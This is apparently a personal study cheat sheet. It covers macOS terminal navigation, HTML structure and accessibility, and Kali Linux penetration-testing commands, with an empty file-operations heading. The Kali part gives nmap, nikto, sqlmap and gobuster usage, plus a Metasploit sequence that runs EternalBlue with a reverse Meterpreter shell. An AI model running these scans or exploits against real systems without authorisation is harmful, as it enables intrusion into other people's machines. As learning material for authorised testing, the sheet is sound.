MacBook Terminal Commands

Navigation & Directory Management

Use: Move between folders, see your current working path, and create new folders.

# pwd — Show current folder
$ pwd
/Users/umarukargbo/Documents/GitHub

# ls — List files and folders
$ ls
cyber  projects  website

# cd — Change directory
$ cd ~/Documents

# mkdir -p — Create nested folders
$ mkdir -p projects/web/src

# pushd / popd — Save and return to previous location
$ pushd /Applications
$ popd

File Operations & Management

Use: Create new files, read content, copy/rename files, and delete temporary data.

Writing HTML Explained

Document Structure

<!DOCTYPE html> declares HTML5. <html> wraps all. <head> holds metadata, <body> holds visible content.

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" 
      content="width=device-width, initial-scale=1.0">
    <title>Page Title</title>
  </head>
  <body>
    <!-- Visible content -->
  </body>
</html>

Semantic HTML

Use <header>, <nav>, <main>, <article>, <section>, <footer> instead of generic <div>. Screen readers and search engines understand better.

<header>
  <h1>Site Title</h1>
  <nav>
    <a href="/">Home</a>
    <a href="/about">About</a>
  </nav>
</header>

<main>
  <article>
    <h2>Article Title</h2>
    <p>Content...</p>
  </article>
</main>

<footer>
  <p>© 2026 Company</p>
</footer>

Headings — Document Hierarchy

Use exactly one <h1> per page. Use <h2> for sections, <h3> for subsections. Never skip heading levels.

<h1>Main Title</h1>
<p>Intro...</p>

<h2>First Section</h2>
<p>Content...</p>

<h3>Subsection</h3>
<p>More detail...</p>

<h2>Second Section</h2>
<p>Content...</p>

Forms with Accessibility

Pair <label> with <input> using for attribute. Improves usability, especially on mobile and with screen readers.

<form action="/contact" method="post">
  <fieldset>
    <legend>Personal Info</legend>
    
    <label for="fname">First Name:</label>
    <input id="fname" name="firstName" 
      type="text" required>
    
    <label for="email">Email:</label>
    <input id="email" name="email" 
      type="email" required>
  </fieldset>
  
  <button type="submit">Send</button>
</form>

Lists

Use <ul> for unordered lists, <ol> for ordered. Each item in <li>.

<h3>Shopping List</h3>
<ul>
  <li>Milk</li>
  <li>Eggs</li>
  <li>Bread</li>
</ul>

<h3>Recipe Steps</h3>
<ol>
  <li>Preheat oven
    <ul>
      <li>Set to 350°F</li>
      <li>Wait 10 mins</li>
    </ul>
  </li>
  <li>Mix ingredients</li>
  <li>Bake 30 mins</li>
</ol>

Links

Use <a href=""> for links. For external links, add target="_blank" rel="noopener". Use anchors to jump within pages.

<!-- Simple link -->
<a href="/about.html">About Us</a>

<!-- External (new tab) -->
<a href="https://google.com" 
  target="_blank" rel="noopener">
  Visit Google
</a>

<!-- Anchor jump -->
<a href="#contact">Go to Contact</a>

<!-- Anchor target -->
<section id="contact">
  <h2>Contact Us</h2>
  <p>info@example.com</p>
</section>

Images

Always include alt text for accessibility. Use srcset for responsive images on different screen sizes.

<!-- Basic image -->
<img src="photo.jpg" alt="Sunset" 
  width="400" height="300">

<!-- Responsive with srcset -->
<img 
  src="photo.jpg"
  srcset="photo-small.jpg 600w, 
    photo-large.jpg 1400w"
  sizes="(max-width: 600px) 100vw, 80vw"
  alt="Sunset">

<!-- Picture for different formats -->
<picture>
  <source srcset="image.webp" 
    type="image/webp">
  <img src="image.jpg" alt="Fallback">
</picture>

Buttons & Elements

Use proper <button> elements with type attributes. Style with CSS.

<!-- Submit -->
<button type="submit">Send</button>

<!-- Reset -->
<button type="reset">Clear</button>

<!-- Regular button -->
<button type="button" onclick="handleClick()">
  Click Me
</button>

<!-- Disabled -->
<button type="submit" disabled>
  Submit
</button>

<!-- Link as button -->
<a href="/page" role="button" class="btn">
  Visit Page
</a>

Meta Tags for SEO

Add meta tags in <head> for search engines and social sharing.

<head>
  <meta charset="UTF-8">
  <meta name="viewport" 
    content="width=device-width">
  
  <!-- SEO -->
  <title>Page Title (55-60 chars)</title>
  <meta name="description" 
    content="Description (155-160 chars)">
  <meta name="keywords" 
    content="keyword1, keyword2">
  
  <!-- Social (Open Graph) -->
  <meta property="og:title" content="Title">
  <meta property="og:description" 
    content="Description">
  <meta property="og:image" content="img.jpg">
  
  <!-- Favicon -->
  <link rel="icon" href="favicon.ico">
</head>

Accessibility (a11y)

Use ARIA attributes and semantic HTML to make pages accessible to screen readers and keyboard users.

<!-- ARIA labels -->
<button aria-label="Close menu">×</button>

<!-- Live region updates -->
<div aria-live="polite">
  Results updated
</div>

<!-- Skip to main -->
<a href="#main" class="skip-link">
  Skip to main
</a>
<main id="main">...</main>

<!-- Required field -->
<label>
  Email <span aria-label="required">*</span>
</label>
<input type="email" required 
  aria-required="true">

Best Practices

  • Always close tags: <p>Text</p>
  • Indent nested elements for readability
  • Use semantic tags instead of all <div>
  • Add alt text to images for accessibility
  • Use lowercase tags: <header> not <HEADER>
  • Link CSS in head: <link rel="stylesheet" href="styles.css">
  • Place scripts before closing body tag
  • Use data attributes for JS: <div data-toggle="modal">
  • Avoid inline styles — keep CSS external
  • Test on mobile and with keyboard
  • Validate with W3C: validator.w3.org
  • Use semantic form labels with for attribute

Kali Linux — Reconnaissance Tools

nmap (Network Mapping)

Purpose: Scan networks, discover hosts, identify open ports and services.

# Scan a host for open ports
nmap 192.168.1.1

# Scan a network range
nmap 192.168.1.0/24

# Verbose with service detection
nmap -sV -p- 192.168.1.1

# OS detection
nmap -O 192.168.1.1

# Aggressive scan
nmap -A 192.168.1.1

# Save to file
nmap -oN results.txt 192.168.1.1

whois (Domain Info)

Purpose: Look up domain registration and ownership details.

# Query domain
whois example.com

# Query IP address
whois 8.8.8.8

# Specific server
whois -h whois.verisign-grs.com example.com

# No referrals
whois --no-referrals example.com

dig (DNS Lookup)

Purpose: Query DNS servers for domains, subdomains, and records.

# Basic lookup
dig example.com

# Query specific record
dig example.com A
dig example.com MX
dig example.com NS

# Reverse DNS
dig -x 8.8.8.8

Kali Linux — Scanning & Testing

nikto (Web Scanner)

Purpose: Scan web servers for vulnerabilities, misconfigurations, outdated software.

# Basic scan
nikto -h http://example.com

# Specify port
nikto -h http://example.com -p 8080

# Output to file
nikto -h http://example.com -o report.txt

sqlmap (SQL Injection)

Purpose: Test web applications for SQL injection vulnerabilities.

# Test URL parameter
sqlmap -u "http://example.com/page.php?id=1"

# POST data
sqlmap -u "http://example.com/login" \
  --data="user=admin&pass=test"

# Database enumeration
sqlmap -u "http://example.com/?id=1" \
  --dbs

Metasploit Basics

Purpose: Framework for exploitation and penetration testing.

# Start msfconsole
msfconsole

# List exploits
show exploits

# Select exploit
use exploit/windows/smb/ms17_010_eternalblue

# Set options
set RHOSTS 192.168.1.100
set PAYLOAD windows/meterpreter/reverse_tcp

# Run exploit
run

Kali Linux — Information Gathering

theHarvester (Email/Domain Finder)

Purpose: Search for subdomains, emails, IPs, and URLs from public sources.

# Harvest from all sources
theHarvester -d example.com -b all

# Specific source (Google)
theHarvester -d example.com -b google

# With proxy
theHarvester -d example.com -p proxy.com:8080

# Help
theHarvester -h

exiftool (Metadata)

Purpose: Extract and analyze metadata from images, PDFs, files.

# Extract metadata
exiftool photo.jpg

# GPS coordinates
exiftool -GPS* photo.jpg

# PDF metadata
exiftool document.pdf

# Remove metadata
exiftool -all= photo.jpg

# Multiple files
exiftool *.jpg

gobuster (Directory Brute Force)

Purpose: Enumerate directories and files on web servers.

# Directory enumeration
gobuster dir -u http://target.com \
  -w /usr/share/wordlists/dirb/common.txt

# Specific extensions
gobuster dir -u http://target.com -w words.txt \
  -x .php,.html,.txt

# Show status codes
gobuster dir -u http://target.com -w words.txt \
  -s 200,301,302

# With cookies
gobuster dir -u http://target.com -w words.txt \
  -c "session=abc123"

Kali Linux — Quick Start Guide

Setup & Installation

# Update system
sudo apt update && sudo apt upgrade

# Install common tools
sudo apt install nmap nikto sqlmap \
  aircrack-ng john hydra

# Check tool version
nmap --version
nikto -Version

# Get help
nmap -h
nikto -h

Penetration Testing Workflow

# 1. Reconnaissance (Passive)
whois example.com
dig example.com
theHarvester -d example.com -b all

# 2. Scanning (Active)
nmap -sV -A -p- example.com
nikto -h http://example.com

# 3. Enumeration
gobuster dir -u http://example.com -w wordlist.txt

# 4. Vulnerability Analysis
sqlmap -u "http://example.com/page?id=1"

# 5. Exploitation
msfconsole
# use exploit/...
# set RHOSTS example.com
# run

# 6. Post-Exploitation
# Document findings for report

Important Reminders

  • Always get written permission before testing any system
  • Start passive: WHOIS, DNS before active scanning
  • Use -h or --help to see all tool options
  • Save results: Use -o flags for documentation
  • Verbose mode: Use -v or -vv for detailed output
  • Combine tools: Scan → Enumerate → Test workflow
  • Document everything for the final report
